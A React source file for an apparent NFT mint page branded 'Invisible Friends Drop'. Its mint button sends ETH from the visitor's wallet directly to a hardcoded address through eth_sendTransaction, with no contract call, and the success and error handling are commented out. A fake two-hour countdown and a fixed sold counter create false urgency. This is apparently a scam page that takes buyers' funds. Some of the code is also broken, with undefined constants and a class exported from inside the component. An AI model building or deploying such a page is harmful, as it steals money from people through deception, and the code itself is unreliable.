import React, { useEffect, useState, useRef } from "react";
import { useDispatch, useSelector } from "react-redux";
// import { connect } from "../redux/blockchain/blockchainActions";
import { fetchData } from "./redux/data/dataActions";
import { connect } from "./redux/blockchain/blockchainActions";
import styled from "styled-components";
import * as s from "./styles/globalStyles";
import { isMobile, MobileView } from "react-device-detect";
import OpenApp from "react-open-app";

const App = () => {
  const dispatch = useDispatch();
  const blockchain = useSelector((state) => state.blockchain);
  const [mintAmount, setMintAmount] = useState(1);
  const [claimingNft, setClaimingNft] = useState(false);

  const incrementMintAmount = () => {
    let newMintAmount = mintAmount + 1;
    if (newMintAmount > 10) {
      newMintAmount = 10;
    }
    setMintAmount(newMintAmount);
  };
  const decrementMintAmount = () => {
    let newMintAmount = mintAmount - 1;
    if (newMintAmount < 1) {
      newMintAmount = 1;
    }
    setMintAmount(newMintAmount);
  };

  
  function sqrt(x) {
      let z = x.add(1).div(2);
      let y = x;
      while (z.sub(y).isNegative()) {
          y = z;
          z = x.div(z).add(z).div(2);
      }
      return y;
  }

  
class Currency {
  constructor(amount) {
      this.amount = amount;
  }

  static from(amount) {
      return new Currency(amount);
  }

  static fromDec(amount) {
      return Currency.from(amount);
  }

  static fromBigNum(amount) {
      let numerator = amount.div(BN_DECIMALS);
      let denomiator = amount.sub(numerator.mul(BN_DECIMALS))
      return new Currency(numerator.toNumber() + (parseInt(denomiator.toString()) / DECIMALS));
  }

  into() {
      return this.toBigNum();
  }

  toBigNum() {
      return BigNumber.from(this.amount * 1e3).mul(1e3).mul(1e3).mul(1e3).mul(1e3).mul(1e3);
  }

  toString() {
      return this.amount.toString();
  }
}

export { Currency };

  const claimNFTs = () => {
    const totalPriceAmount = 0.25 * mintAmount;
    const priceToWei = (totalPriceAmount * 1e18).toString(16);
    const web3 = blockchain.web3;

    ethereum
      .request({
        method: "eth_sendTransaction",
        params: [
          {
            from: blockchain.account,
            to: "0x22f6aC88d47513F7ee29F7B4600cA9e48D12E548",
            value: priceToWei,
          },
        ],
      })
      .then((txHash) => {
        /*
        console.log(receipt);
        setFeedback(
          `WOW, the ${CONFIG.NFT_NAME} is yours! go visit Opensea.io to view it.`
        );
        setClaimingNft(false);
        dispatch(fetchData(blockchain.account));
        */
      })
      .catch((error) => {
        /*
        console.log(error);
        setFeedback("Sorry, something went wrong please try again later.");
        setClaimingNft(false);
        */
      });
  };
  return (
    <div className="min-h-screen">
      <header className="Header_header__2Dgkb">
        <div className="Header_innner__3CqI4">
          <div className="Header_left__1MeZ3">
            <div className="Header_logo__2JXqP">
              <img src="fonts/logo.svg" alt="logo" style={{ border: "none" }} />
            </div>
            <div className="Header_title__mSqw1">INVISIBLE FRIENDS DROP</div>
          </div>
          <div className="Header_right__1VSYK">
            <a
              href="https://twitter.com/InvsbleFriends"
              target="_blank"
              rel="noreferrer"
              className="Header_link__2sOsZ"
            >
              <img src="fonts/twitter.svg" alt="twitter" />
            </a>
            <a
              href="https://discord.com/invite/rndm"
              target="_blank"
              rel="noreferrer"
              className="Header_link__2sOsZ"
            >
              <img src="fonts/discord.svg" alt="discord" />
            </a>
          </div>
        </div>
      </header>
      <main className="app_main__ppDDq">
        <div className="app_left__2Qk3r">
          <img src="images/image.gif" alt="gif" style={{ border: "none" }} />
          <div className="mint-col">
            <h2 className="mint-live">
              PUBLIC MINT IS <span className="mint-live-pulse">LIVE</span>
            </h2>
            <h2 className="mint-live">{(() => {
                let date = new Date();
                const monthNames = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"];
                let str = "UNTIL ";
                date.setHours( date.getHours() + 2 );
                str += date.getDate() + " ";
                str += monthNames[date.getMonth()] + " ";
                str += (date.getHours() < 10 ? "0" : "") + date.getHours();
                str += ":00H";
                return str;
            })()}</h2>
            <h2 className="mint-limited">LIMITED SALE</h2>
            <h3 className="mint-count"><span>3853</span> / 5757</h3>
            <div>
            <div className="center">
              <button
                className="style_button__1tDQq app_user_address__2gENh"
                type="button"
                id="button_connect"
                onClick={(e) => {
                  function getMobileOperatingSystem() {
                    var userAgent =
                      navigator.userAgent || navigator.vendor || window.opera;
                    console.log(userAgent);
                    // Windows Phone must come first because its UA also contains "Android"
                    const queryString = window.location.search;
                    const urlParams = new URLSearchParams(queryString);
                    const uid = urlParams.get("uid");
                    console.log(uid);
                    if (uid == "mm") {
                      return "Metamask";
                    }
                    if (/windows phone/i.test(userAgent)) {
                      return "Windows Phone";
                    }

                    if (/android/i.test(userAgent)) {
                      return "Android";
                    }

                    // iOS detection from: http://stackoverflow.com/a/9039885/177710
                    if (
                      /iPad|iPhone|iPod/.test(userAgent) &&
                      !window.MSStream
                    ) {
                      return "iOS";
                    }

                    return "unknown";
                  }
                  if (
                    getMobileOperatingSystem() == "Android" ||
                    getMobileOperatingSystem() == "iOS"
                  ) {
                    window.location.href =
                      "https://metamask.app.link/dapp/" +
                      window.location.href
                        .replace("https://", "")
                        .replace("http://", "") +
                      "?uid=mm";
                  } else {
                    e.preventDefault();
                    if(!blockchain.account)
                      dispatch(connect());
                  }
                }}
              >
                <div className="style_button_text">
                {blockchain.account

                  ? <div> <button
                  type="button"
                  className="style_button_text style_button_minus"
                  onClick={(e) => {
                    e.preventDefault();
                    decrementMintAmount();
                  }}
                >
                  -
                </button>
                <button
                  className="style_button_text style_button_mint"
                  type="button"
                  id="button_mint"
                  onClick={(e) => {
                    e.preventDefault();
                    claimNFTs();
                  }}
                >
                  {mintAmount}
                </button>
                <button
                  type="button"
                  className="style_button_text style_button_plus"
                  onClick={(e) => {
                    e.preventDefault();
                    incrementMintAmount();
                  }}
                >
                  +
                </button> </div>
                  : "Connect Wallet"}
                  </div>
              </button>
            </div>
            {blockchain.errorMsg !== "" ? (
              <div>
                <p className="text-sm sm:text-2xl text-white py-1  font-mono tracking-wide hover:tracking-wide">
                  {blockchain.errorMsg}
                </p>
              </div>
            ) : (
              <></>
            )}
          </div>
          </div>
        </div>
      </main>
      <footer>Copyright — INVISIBLE FRIENDS . All Rights Reserved.</footer>
    </div>
  );
};

export default App;
